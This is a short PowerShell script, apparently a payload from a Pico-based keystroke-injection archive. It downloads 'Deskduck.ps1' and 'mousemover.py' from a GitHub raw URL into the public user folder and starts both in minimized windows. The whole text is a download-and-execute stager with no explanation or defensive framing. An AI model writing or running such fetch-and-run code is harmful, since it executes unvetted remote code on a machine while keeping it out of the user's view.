Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jackalopealope/MyPicoArchive/main/Deskduck.ps1" -OutFile "C:\Users\Public\Deskduck.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jackalopealope/MyPicoArchive/main/mousemover.py" -OutFile "C:\Users\Public\mousemover.py"
Start-Process powershell -ArgumentList "C:\Users\Public\Deskduck.ps1" -WindowStyle Minimized
Start-Process python3 -ArgumentList "C:\Users\Public\mousemover.py" -WindowStyle Minimized